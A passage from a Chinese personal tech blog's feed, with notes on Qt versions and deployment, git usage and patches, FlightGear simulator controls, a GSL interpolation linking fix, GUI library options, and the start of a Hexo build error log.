<h1 id="QT版本选择"><a href="#QT版本选择" class="headerlink" title="QT版本选择"></a>QT版本选择</h1><p>QT有很多版本，各个版本之间可能不兼容，应根据需求选择合适的版本。常用的QT LTS版本有：</p>
<ul>
<li>Qt4: 4.8.7      4.X 系列终结版本</li>
<li>Qt5: 5.6 LTS    长期支持版本</li>
<li>Qt5: 5.9 LTS    长期支持版本</li>
<li>Qt5: 5.12 LTS   长期支持版本</li>
<li>Qt5: 5.15 LTS 长期支持版本</li>
<li>Qt6：2020年12月8日发布了</li>
</ul>
<p>Qt6 在 Win 平台将只支持 Win10 及其以上。嵌入式类应用最好用QT 4.8版本。支持Win XP最好选择QT 5.6.3 版本。</p>
<h1 id="QT应用部署"><a href="#QT应用部署" class="headerlink" title="QT应用部署"></a>QT应用部署</h1><p>windeployqt是一个用于将Qt部署到Windows的小工具。这个工具可以在 QTDIR/bin/windeployqt下面找到。它需要在命令行环境下使用。</p>
<p>windeployqt以一个.exe或者一个含有.exe的文件夹作为参数。它会扫描可执行文件以寻找这个可执行文件的依赖。如果使用–qmldir选项传递目录，windeployqt会使用qmlimportscanner工具来扫描文件夹中的QML文件以获取QML导入的依赖。被扫描出来的依赖将会被复制到这个可执行文件夹中。</p>
<p>对于Windows桌面应用程序，编译器所需要的运行时文件也会被复制到部署文件夹中。</p>
<p>有时候应用程序可能会需要额外的第三方库（例如，数据库相关的库），这些库不会被windeployqt添加，需要手动添加。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windeployqt musicplayer1.exe</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Qt" target="_blank" rel="noopener">Qt</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/u011430225/article/details/68485805" target="_blank" rel="noopener">Qt最好用评价最高的是哪个版本？</a>,by lk989898.</li>
<li><a href="https://blog.csdn.net/bailutuo7403/article/details/101590656" target="_blank" rel="noopener">如何选择合适的Qt5版本？</a>,by bailutuo7403.</li>
<li><a href="https://blog.csdn.net/libaineu2004/article/details/80415755" target="_blank" rel="noopener">Qt5对WinXP系统的支持和兼容情况</a>,by libaineu2004.</li>
<li><a href="https://www.codenong.com/cs105164390/" target="_blank" rel="noopener">Qt之应用部署（Windows）</a>,by 码农家园.</li>
<li><a href="https://zhuanlan.zhihu.com/p/469781266" target="_blank" rel="noopener">Qt示例入门指南详解：下载安装</a>,by duan.</li>
<li><a href="https://blog.csdn.net/u012790503/article/details/123214902" target="_blank" rel="noopener">windeploypt.exe的使用与避坑（windows平台）</a>,by 撬动未来的支点.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>Git_Clone大项目超过1G失败解决方案</title>
    <url>/2019/03/09/Git-Clone%E5%A4%A7%E9%A1%B9%E7%9B%AE%E8%B6%85%E8%BF%871G%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>SourceForge.net，又称SF.net，是开源软件的开发者进行开发管理的集中式场所，也是全球最大开源软件开发平台和仓库。FlightGear的源代码就托管在该平台。最近在使用Git克隆FlightGear的子项目fgdata时，老是到1G时失败。具体情况如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># git clone fgdata大项目时超过1G就会出错</span><br><span class="line">$ git clone https:&#x2F;&#x2F;git.code.sf.net&#x2F;p&#x2F;flightgear&#x2F;fgdata</span><br><span class="line">Cloning into &#39;fgdata&#39;...</span><br><span class="line">remote: Counting objects: 61455, done.</span><br><span class="line">remote: Compressing objects: 100% (27321&#x2F;27321), done.</span><br><span class="line">error: RPC failed; curl 56 GnuTLS recv error (-110): The TLS connection was non-properly terminated.</span><br><span class="line">fatal: The remote end hung up unexpectedly</span><br><span class="line">fatal: early EOF</span><br><span class="line">fatal: index-pack failed</span><br></pre></td></tr></table></figure>

<p>经多种方案尝试，使用如下方法可避免该问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone git:&#x2F;&#x2F;git.code.sf.net&#x2F;p&#x2F;flightgear&#x2F;fgdata</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://forum.flightgear.org/viewtopic.php?f=20&t=33620&p=329768&hilit=clone+fgdata+fail#p329768" target="_blank" rel="noopener">FGdata downloading error</a>,by flightgear forum.</li>
<li><a href="https://sourceforge.net/p/forge/documentation/Git/#anonymous-access-read-only" target="_blank" rel="noopener">SourceForge Support</a>,by sourceforge.</li>
<li><a href="https://www.aneasystone.com/archives/2015/08/git-clone-faster.html" target="_blank" rel="noopener">git clone 太慢怎么办？</a>, by aneasystone.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>FlightGear简易飞行教程</title>
    <url>/2019/03/29/FlightGear%E7%AE%80%E6%98%93%E9%A3%9E%E8%A1%8C%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>FlightGear是一个始于1997年多平台飞行模拟器、自由软件项目。下面简要介绍如何在FlightGear中驾驶飞行。</p>
<h1 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h1><h2 id="飞机操纵"><a href="#飞机操纵" class="headerlink" title="飞机操纵"></a>飞机操纵</h2><ul>
<li>9/3</li>
</ul>
<p>推力：9增加推力（油门），3减小推力（油门）</p>
<ul>
<li>4/6</li>
</ul>
<p>副翼：4向左滚转，6向右滚转</p>
<ul>
<li>8/2</li>
</ul>
<p>升降舵：8推杆低头，2拉杆抬头</p>
<ul>
<li>0/Enter</li>
</ul>
<p>方向舵：0向右偏航，Enter向右偏航</p>
<ul>
<li>5</li>
</ul>
<p>居中副翼/升降舵/方向舵</p>
<ul>
<li>]/[</li>
</ul>
<p>放/收襟翼</p>
<ul>
<li>g/G</li>
</ul>
<p>收/放起落架</p>
<ul>
<li>b/B</li>
</ul>
<p>刹车（全部轮胎）/或释放刹车</p>
<h2 id="视角变换"><a href="#视角变换" class="headerlink" title="视角变换"></a>视角变换</h2><ul>
<li>x/X</li>
</ul>
<p>放大/缩小</p>
<ul>
<li>v/V</li>
</ul>
<p>切换飞行员的观测模式</p>
<ul>
<li>Tab</li>
</ul>
<p>循环切换鼠标模式：正常模式(默认)、控制模式和查看模式。</p>
<h2 id="自动驾驶"><a href="#自动驾驶" class="headerlink" title="自动驾驶"></a>自动驾驶</h2><ul>
<li>Ctrl + A</li>
</ul>
<p>高度保持开关</p>
<ul>
<li>Ctrl + G</li>
</ul>
<p>下滑角跟随开关</p>
<ul>
<li>Ctrl + H</li>
</ul>
<p>航向保持开关</p>
<ul>
<li>Ctrl + N</li>
</ul>
<p>NAV 开关</p>
<ul>
<li>Ctrl + T</li>
</ul>
<p>地形跟随开关</p>
<ul>
<li>Ctrl + U</li>
</ul>
<p>高度增加 1000 英尺（紧急情况）</p>
<h1 id="起飞教程"><a href="#起飞教程" class="headerlink" title="起飞教程"></a>起飞教程</h1><p>起飞步骤如下：</p>
<p>1.启动引擎</p>
<p>在驾驶舱内通过按键启动飞机引擎的过程很麻烦，且各种类型飞机引擎启动过程不一样。幸运的是，FlightGear的飞机菜单中会有自动启动或快速启动的子菜单，点击它们自动启动飞机引擎和各种航电设备。</p>
<p>2.释放刹车</p>
<p>使用快捷键B释放刹车。</p>
<p>3.滑跑起飞</p>
<p>飞机尽量在跑道中央进行滑跑起飞，使用快捷键“0/Enter”控制飞机方向舵，使飞机在跑道中央滑跑; 当飞机达到起飞速度（一般200～300km/h）时，<strong>先使用快捷键“5”居中副翼/升降舵/方向舵，以降低飞机在空中操纵的难度，再使用快捷键“8/2”操纵飞机升降舵，注意应避免仰角过大</strong>。</p>
<p><strong>注意，FlightGear 2020.3 版本中F16不支持数字小键盘！</strong></p>
<h1 id="武器使用教程"><a href="#武器使用教程" class="headerlink" title="武器使用教程"></a>武器使用教程</h1><p>各种战斗机可通过飞机菜单选择不同武器加载方案。但各种战斗机的武器使用方法不一样，对应武器发射的快捷键也不一样，可通过菜单“Help-&gt;Aircraft Help”查看具体飞机的自定义快捷键。下面以官方飞机库中的F15和F16为例说明武器使用方法。</p>
<h2 id="F15"><a href="#F15" class="headerlink" title="F15"></a>F15</h2><p>F15武器使用步骤如下：</p>
<p>1.打开Master ARM开关</p>
<p>该军械总开关防止武器误发射，使用快捷键Ctrl+w控制。</p>
<p>2.选择武器</p>
<p>可选择航炮和导弹等武器，使用快捷键m控制</p>
<p>3.发射航炮或释放导弹</p>
<p>使用快捷键e控制，注意航炮按e就发射，而导弹按e得持续3秒钟才能释放导弹。</p>
<p>4.使用诱饵弹</p>
<p>使用快捷键Ctrl+q释放诱饵弹。</p>
<h2 id="F16"><a href="#F16" class="headerlink" title="F16"></a>F16</h2><p>F16武器使用步骤如下：</p>
<p>1.打开Master ARM开关</p>
<p>该开关防止武器误发射，使用快捷键m控制。</p>
<p>2.选择武器</p>
<p>可选择航炮和导弹等武器，使用快捷键w控制</p>
<p>3.发射航炮或释放导弹</p>
<p>使用快捷键e控制，注意航炮按e就发射，而导弹按e得持续3秒钟才能释放导弹。</p>
<p>4.使用诱饵弹</p>
<p>使用快捷键q释放诱饵弹。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/FlightGear" target="_blank" rel="noopener">FlightGear</a>,by wikipedia.</li>
<li><a href="http://www.flightgear.org.cn/thread-23-1-1.html" target="_blank" rel="noopener">FlightGear基本飞行操作快捷键</a>,by zxc.</li>
<li><a href="https://forum.flightgear.org/viewtopic.php?f=20&t=38022" target="_blank" rel="noopener">“illegal argument” on some specific aircrafts</a>,by flightgear forum.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>Git用法总结</title>
    <url>/2018/05/24/Git%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>git是一个分布式版本控制软件，最初由林纳斯·托瓦兹（Linus Torvalds）创作，于2005年以GPL发布。最初目的是为更好地管理Linux内核开发而设计<sup>[1]</sup>。</p>
<p align="center">
    <img src="images/git_structure.png" width="90%" alt="git结构"/>
</p>

<h1 id="新建代码库"><a href="#新建代码库" class="headerlink" title="新建代码库"></a>新建代码库</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在当前目录新建一个Git代码库</span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"># 新建一个目录，将其初始化为Git代码库</span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"># 下载一个项目和它的整个代码历史</span><br><span class="line">$ git clone [url]</span><br></pre></td></tr></table></figure>

<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 显示当前的Git配置</span><br><span class="line">$ git config --list</span><br><span class="line"></span><br><span class="line"># 编辑Git配置文件</span><br><span class="line">$ git config -e [--global]</span><br><span class="line"></span><br><span class="line"># 设置提交代码时的用户信息</span><br><span class="line">$ git config [--global] user.name &quot;[name]&quot;</span><br><span class="line">$ git config [--global] user.email &quot;[email address]&quot;</span><br></pre></td></tr></table></figure>

<h1 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 提交暂存区到仓库区</span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到仓库区</span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"># 提交工作区自上次commit之后的变化，直接到仓库区</span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"># 提交时显示所有diff信息</span><br><span class="line">$ git commit -v</span><br><span class="line"></span><br><span class="line"># 使用一次新的commit，替代上一次提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"># 重做上一次commit，并包括指定文件的新变化</span><br><span class="line">$ git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure>

<h1 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 显示有变更的文件</span><br><span class="line">$ git status</span><br><span class="line"></span><br><span class="line"># 显示当前分支的版本历史</span><br><span class="line">$ git log</span><br><span class="line"></span><br><span class="line"># 显示commit历史，以及每次commit发生变更的文件</span><br><span class="line">$ git log --stat</span><br><span class="line"></span><br><span class="line"># 搜索提交历史，根据关键词</span><br><span class="line">$ git log -S [keyword]</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，每个commit占据一行</span><br><span class="line">$ git log [tag] HEAD --pretty&#x3D;format:%s</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件</span><br><span class="line">$ git log [tag] HEAD --grep feature</span><br><span class="line"></span><br><span class="line"># 显示某个文件的版本历史，包括文件改名</span><br><span class="line">$ git log --follow [file]</span><br><span class="line">$ git whatchanged [file]</span><br><span class="line"></span><br><span class="line"># 显示指定文件相关的每一次diff</span><br><span class="line">$ git log -p [file]</span><br><span class="line"></span><br><span class="line"># 显示过去5次提交</span><br><span class="line">$ git log -5 --pretty --oneline</span><br><span class="line"></span><br><span class="line"># 显示所有提交过的用户，按提交次数排序</span><br><span class="line">$ git shortlog -sn</span><br><span class="line"></span><br><span class="line"># 显示指定文件是什么人在什么时间修改过</span><br><span class="line">$ git blame [file]</span><br><span class="line"></span><br><span class="line"># 显示暂存区和工作区的差异</span><br><span class="line">$ git diff</span><br><span class="line"></span><br><span class="line"># 显示暂存区和上一个commit的差异</span><br><span class="line">$ git diff --cached [file]</span><br><span class="line"></span><br><span class="line"># 显示工作区与当前分支最新commit之间的差异</span><br><span class="line">$ git diff HEAD</span><br><span class="line"></span><br><span class="line"># 显示两次提交之间的差异</span><br><span class="line">$ git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"># 显示今天你写了多少行代码</span><br><span class="line">$ git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 显示某次提交的元数据和内容变化</span><br><span class="line">$ git show [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交发生变化的文件</span><br><span class="line">$ git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交时，某个文件的内容</span><br><span class="line">$ git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"># 显示当前分支的最近几次提交</span><br><span class="line">$ git reflog</span><br></pre></td></tr></table></figure>

<h1 id="Git-工具-子模块"><a href="#Git-工具-子模块" class="headerlink" title="Git 工具 - 子模块"></a>Git 工具 - 子模块</h1><p>有种情况我们经常会遇到：某个工作中的项目需要包含并使用另一个项目。 也许是第三方库，或者你独立开发的，用于多个父项目的库。 现在问题来了：你想要把它们当做两个独立的项目，同时又想在一个项目中使用另一个。</p>
<p>Git 通过子模块来解决这个问题。 子模块允许你将一个 Git 仓库作为另一个 Git 仓库的子目录。 它能让你将另一个仓库克隆到自己的项目中，同时还保持提交的独立。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git submodule add https:&#x2F;&#x2F;github.com&#x2F;chaconinc&#x2F;DbConnector</span><br><span class="line">Cloning into &#39;DbConnector&#39;...</span><br><span class="line">remote: Counting objects: 11, done.</span><br><span class="line">remote: Compressing objects: 100% (10&#x2F;10), done.</span><br><span class="line">remote: Total 11 (delta 0), reused 11 (delta 0)</span><br><span class="line">Unpacking objects: 100% (11&#x2F;11), done.</span><br><span class="line">Checking connectivity... done.</span><br></pre></td></tr></table></figure>

<p>默认情况下，子模块会将子项目放到一个与仓库同名的目录中，本例中是 “DbConnector”。 如果你想要放到其他地方，那么可以在命令结尾添加一个不同的路径。</p>
<h1 id="Git代理设置"><a href="#Git代理设置" class="headerlink" title="Git代理设置"></a>Git代理设置</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">git config --global --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --global --unset https.proxy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">npm config delete proxy</span><br></pre></td></tr></table></figure>

<h1 id="不常用操作"><a href="#不常用操作" class="headerlink" title="不常用操作"></a>不常用操作</h1><ul>
<li><p>查看代码仓库中标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure>
</li>
<li><p>检出指定标签代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout tag_name</span><br></pre></td></tr></table></figure>
</li>
<li><p>丢弃本地修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout .</span><br></pre></td></tr></table></figure>
</li>
<li><p>打包导出仓库代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git archive --format zip --output ..\emsdk\zips\1.38.8.zip HEAD</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://zh.wikipedia.org/zh-hans/Git" target="_blank" rel="noopener">Git</a>, by wikipedia</li>
<li><a href="http://yijiebuyi.com/blog/eacf4d053fad77affffae397d9af7172.html" target="_blank" rel="noopener">git 如何获取指定 tag 代码</a>, by 一介布衣</li>
<li><a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">常用 Git 命令清单</a>,by 阮一峰.</li>
<li><a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E5%AD%90%E6%A8%A1%E5%9D%97" target="_blank" rel="noopener">7.11 Git 工具 - 子模块</a>,by git.</li>
<li><a href="https://www.jianshu.com/p/cbb302510811" target="_blank" rel="noopener">Git submodule用法</a>,by jinlei_123.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>GSL插值函数编译链接出错解决方法</title>
    <url>/2019/12/11/GSL%E6%8F%92%E5%80%BC%E5%87%BD%E6%95%B0%E7%BC%96%E8%AF%91%E9%93%BE%E6%8E%A5%E5%87%BA%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>在Windows平台使用VS2017社区版将开源数学库GSL编译链接成DLL后，使用官方示例测试其插值函数。在编译链接该示例过程中报</p>
<blockquote>
<p>LNK2001: unresolved external symbol _gsl_interp_cspline</p>
</blockquote>
<p>的错误。</p>
<p>解决方法如下，在示例开始处定义如下宏即可。</p>
<blockquote>
<p>#define GSL_DLL</p>
</blockquote>
<p>完整可运行示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define GSL_DLL</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">#include &lt;gsl&#x2F;gsl_errno.h&gt;</span><br><span class="line">#include &lt;gsl&#x2F;gsl_spline.h&gt;</span><br><span class="line"></span><br><span class="line">int</span><br><span class="line">main (void)</span><br><span class="line">&#123;</span><br><span class="line">  int i;</span><br><span class="line">  double xi, yi, x[10], y[10];</span><br><span class="line"></span><br><span class="line">  printf (&quot;#m&#x3D;0,S&#x3D;17\n&quot;);</span><br><span class="line"></span><br><span class="line">  for (i &#x3D; 0; i &lt; 10; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      x[i] &#x3D; i + 0.5 * sin (i);</span><br><span class="line">      y[i] &#x3D; i + cos (i * i);</span><br><span class="line">      printf (&quot;%g %g\n&quot;, x[i], y[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  printf (&quot;#m&#x3D;1,S&#x3D;0\n&quot;);</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    gsl_interp_accel *acc</span><br><span class="line">      &#x3D; gsl_interp_accel_alloc ();</span><br><span class="line">    gsl_spline *spline</span><br><span class="line">      &#x3D; gsl_spline_alloc (gsl_interp_cspline, 10);</span><br><span class="line"></span><br><span class="line">    gsl_spline_init (spline, x, y, 10);</span><br><span class="line"></span><br><span class="line">    for (xi &#x3D; x[0]; xi &lt; x[9]; xi +&#x3D; 0.01)</span><br><span class="line">      &#123;</span><br><span class="line">        yi &#x3D; gsl_spline_eval (spline, xi, acc);</span><br><span class="line">        printf (&quot;%g %g\n&quot;, xi, yi);</span><br><span class="line">      &#125;</span><br><span class="line">    gsl_spline_free (spline);</span><br><span class="line">    gsl_interp_accel_free (acc);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.gnu.org/software/gsl/doc/html/interp.html" target="_blank" rel="noopener">Interpolation</a>,by gsl homepage.</li>
<li><a href="https://lists.gnu.org/archive/html/help-gsl/2008-01/msg00034.html" target="_blank" rel="noopener">[Help-gsl] LNK2001: unresolved external symbol _gsl_interp_cspline</a>,by lists.gnu.org.</li>
<li><a href="https://lists.gnu.org/archive/html/help-gsl/2008-01/msg00036.html" target="_blank" rel="noopener">[Help-gsl] Re: LNK2001: unresolved external symbol _gsl_interp_cspline</a>,by lists.gnu.org.</li>
<li><a href="https://blog.csdn.net/LC_1994/article/details/49515401" target="_blank" rel="noopener">C++求积分代码</a>,by Firekisser.</li>
<li><a href="https://blog.csdn.net/qq_43362405/article/details/105551617" target="_blank" rel="noopener">matlab代码—插值</a>,by 从小练武功.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>GUI开发方案总结</title>
    <url>/2019/10/03/GUI%E5%BC%80%E5%8F%91%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>最近调研GUI开发技术，对相关资料总结一下。</p>
<h1 id="Windows-下的-GUI-库"><a href="#Windows-下的-GUI-库" class="headerlink" title="Windows 下的 GUI 库"></a>Windows 下的 GUI 库</h1><p>Windows 下的 GUI 解决方案比较多：</p>
<ul>
<li>基于 C++ 的有 Qt、MFC、WTL、wxWidgets、DirectUI、Htmlayout；</li>
<li>基于 C# 的有 WinForm、WPF；</li>
<li>基于 Java 的有 AWT、Swing；</li>
<li>基于 Pascal 的 有Delphi；</li>
<li>基于Go语言的有 walk 和 electron；</li>
<li>还有国内初露头角的 aardio；</li>
<li>Visual Basic 曾经很流行，现在逐渐失去了色彩；</li>
<li>如果你有 Web 开发经验，也可以基于 Webkit 或 Chromium 将网页转换为桌面程序。</li>
</ul>
<p>没有哪一种方案能够独霸 Windows，使用比较多的编程语言是 C++、C#、Java。</p>
<h1 id="Linux-下的-GUI-库"><a href="#Linux-下的-GUI-库" class="headerlink" title="Linux 下的 GUI 库"></a>Linux 下的 GUI 库</h1><p>Linux 下常用的 GUI 库有基于 C++ 的 Qt、GTK+、wxWidgets，以及基于 Java 的 AWT 和 Swing。其中最著名的就是 Qt 和 GTK+：KDE 桌面系统已经将 Qt 作为默认的 GUI 库，Gnome 桌面系统也将 GTK+ 作为默认的 GUI 库。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://c.biancheng.net/view/3876.html" target="_blank" rel="noopener">Qt和其它GUI库的对比</a>,by C语言中文网.</li>
<li><a href="https://zh.wikipedia.org/wiki/Qt" target="_blank" rel="noopener">Qt</a>,by wikipedia.</li>
<li><a href="http://c.biancheng.net/view/3851.html" target="_blank" rel="noopener">Qt下载（多种下载通道+所有版本）</a>,by C语言中文网.</li>
<li><a href="http://mirrors.ustc.edu.cn/qtproject/" target="_blank" rel="noopener">Qt镜像站下载</a>,by 中科大镜像站.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Git Patch使用帮助</title>
    <url>/2021/04/28/GitPatch%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>多人协作开发，需要将别人开发的代码合并。这时使用git patch命令合并是最方便。下面介绍这种方法。</p>
<h1 id="git-patch作用"><a href="#git-patch作用" class="headerlink" title="git patch作用"></a>git patch作用</h1><blockquote>
<ul>
<li>什么是patch? 简单来讲,patch中存储的是你对代码的修改</li>
<li>什么是生成patch? 生成patch就是记录你对代码的修改并将其保存在patch文件中</li>
<li>什么是打patch? 打patch就是将patch文件中对代码的修改，应用到源代码，从而把对代码的修改应用到code中。</li>
</ul>
</blockquote>
<h1 id="git-patch用法"><a href="#git-patch用法" class="headerlink" title="git patch用法"></a>git patch用法</h1><h2 id="生成patch"><a href="#生成patch" class="headerlink" title="生成patch"></a>生成patch</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git format-patch HEAD^ 　　　#生成最近的1次commit的patch</span><br><span class="line">$ git format-patch HEAD^^　　　#生成最近的2次commit的patch</span><br><span class="line">$ git format-patch HEAD^^^ 　  #生成最近的3次commit的patch</span><br><span class="line">$ git format-patch HEAD^^^^ 　 #生成最近的4次commit的patch</span><br><span class="line">$ git format-patch &lt;r1&gt;..&lt;r2&gt;  #生成两个commit间的修改的patch（包含两个commit. &lt;r1&gt;和&lt;r2&gt;都是具体的commit号)</span><br><span class="line">$ git format-patch -1 &lt;r1&gt;     #生成单个commit的patch</span><br><span class="line">$ git format-patch &lt;r1&gt;        #生成某commit以来的修改patch（不包含该commit）</span><br><span class="line">$ git format-patch --root &lt;r1&gt;  #生成从根到r1提交的所有patch</span><br></pre></td></tr></table></figure>

<h2 id="应用patch"><a href="#应用patch" class="headerlink" title="应用patch"></a>应用patch</h2><p>检查patch/diff是否能正常打入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git apply --check 【path&#x2F;to&#x2F;xxx.patch】</span><br><span class="line">git apply --check 【path&#x2F;to&#x2F;xxx.diff】</span><br></pre></td></tr></table></figure>

<p>打入patch/diff:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git apply 【path&#x2F;to&#x2F;xxx.patch】</span><br><span class="line">git apply 【path&#x2F;to&#x2F;xxx.diff】</span><br><span class="line">git am 【path&#x2F;to&#x2F;xxx.patch】</span><br></pre></td></tr></table></figure>

<h1 id="TortoiseGit-patch用法"><a href="#TortoiseGit-patch用法" class="headerlink" title="TortoiseGit patch用法"></a>TortoiseGit patch用法</h1><p>TortoiseGit是一个Git版本控制客户端，作为Microsoft Windows的外壳扩展实现。它在GNU通用公共许可协议下作为自由软件发布。使用TortoiseGit 的 Create Patch Serial和 Apply Patch Serial两个菜单可以很方便的产生和应用补丁。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/TortoiseGit" target="_blank" rel="noopener">TortoiseGit</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/ArsenalfanInECNU/p/8931377.html" target="_blank" rel="noopener">如何用git命令生成Patch和打Patch</a>,by 青山牧云人.</li>
<li><a href="https://www.jianshu.com/p/ec04de3f95cc" target="_blank" rel="noopener">Git 打补丁– patch 和 diff 的使用（详细）</a>,by alanwangmodify.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo构建静态博客方法</title>
    <url>/2020/04/18/Hexo%E6%9E%84%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>一直使用Hexo+Github构建静态博客，可突然在使用hexo g -d命令时出故障了，问题如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO  [hexo-math] Using engine &#39;mathjax&#39;</span><br><span class="line">INFO  Start processing</span><br><span class="line">FATAL Something&#39;s wrong. Maybe you can find the solution here: http:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;troubleshooting.html</span><br><span class="line">Template render error: expected variable end</span><br><span class="line">    at Object._prettifyError (F:\blog\node_modules\nunjucks\src\lib.js:35:11)</span><br><span class="line">    at Template.render (F:\blog\node_modules\nunjucks\src\environment.js:526:21)</span><br><span class="line">    at Environment.renderString (F:\blog\node_modules\nunjucks\src\environment.js:364:17)</span><br><span class="line">    at Promise.fromCallback.cb (F:\blog\node_modules\hexo\lib\extend\tag.js:62:48)</span><br><span class="line">    at tryCatcher (F:\blog\node_modules\bluebird\js\release\util.js:16:23)</span><br><span class="line">    at Function.Promise.fromNode.Promise.fromCallback (F:\blog\node_modules\bluebird\js\release\promise.js:180:30)</span><br><span class="line">    at Tag.render (F:\blog\node_modules\hexo\lib\extend\tag.js:62:18)</span><br><span class="line">    at Object.onRenderEnd (F:\blog\node_modules\hexo\lib\hexo\post.js:282:20)</span><br><span class="line">    at 